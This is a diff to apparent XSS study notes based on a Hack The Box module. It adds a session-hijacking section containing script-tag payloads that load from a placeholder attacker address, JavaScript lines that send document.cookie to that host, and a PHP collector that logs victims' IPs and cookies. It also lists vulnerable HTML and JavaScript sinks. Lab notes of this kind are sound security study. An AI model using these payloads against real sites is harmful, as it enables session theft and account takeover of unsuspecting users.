@@ -28,7 +28,7 @@ Payload that does not contain \<script> tag (useful for DOM attacks). Creates ne
 #### Tools
  [XSS Strike](https://github.com/s0md3v/XSStrike), [Brute XSS](https://github.com/rajeshmajumdar/BruteXSS), and [XSSer](https://github.com/epsylon/xsser)
 
-#### Exploit Example
+#### Phishing Exploit Example
 This example was used in HTB's XSS module as an example of how to phish using an XSS exploit.
 
 Example HTML of a basic form
@@ -74,3 +74,64 @@ The command to start a php server to use the index.php created:
 $ sudo php -S 0.0.0.0:800
 ```
 
+#### Session Hijacking Example
+This example was used in HTB's XSS module as an example of session hijacking by stealing a cookie using blind XSS
+
+Example of how a remote script is loaded:
+```html
+	<script src="http://OUR_IP/script.js"></script>
+```
+
+Example of testing fields (to identify vulnerable field) by modifying the source location:
+```html
+<script src=http://OUR_IP/fullname></script> #this goes inside the full-name field
+<script src=http://OUR_IP/username></script> #this goes inside the username field
+```
+
+Example of payloads to steal session cookies (to be written into script.js and stored on webserver):
+```javascript
+document.location='http://OUR_IP/index.php?c='+document.cookie;
+new Image().src='http://OUR_IP/index.php?c='+document.cookie;
+```
+
+When victim views vulnerable page with XSS payload, will trigger 2 requests - (1) to the remote server to obtain script.js and (2) to index.php on the remote server with the cookie information. The index.php needed to steal session cookies:
+```php
+<?php
+if (isset($_GET['c'])) {
+    $list = explode(";", $_GET['c']);
+    foreach ($list as $key => $value) {
+        $cookie = urldecode($value);
+        $file = fopen("cookies.txt", "a+");
+        fputs($file, "Victim IP: {$_SERVER['REMOTE_ADDR']} | Cookie: {$cookie}\n");
+        fclose($file);
+    }
+}
+?>
+```
+
+
+
+#### Vulnerable HTML and JS
+##### HTML
+JavaScript code <script></script>
+CSS Style Code <style></style>
+Tag/Attribute Fields <div name='INPUT'></div>
+HTML Comments <!-- -->
+##### Javascript
+- `DOM.innerHTML`
+- `DOM.outerHTML`
+- `document.write()`
+- `document.writeln()`
+- `document.domain`
+##### jQuery
+- `html()`
+- `parseHTML()`
+- `add()`
+- `append()`
+- `prepend()`
+- `after()`
+- `insertAfter()`
+- `before()`
+- `insertBefore()`
+- `replaceAll()`
+- `replaceWith()`
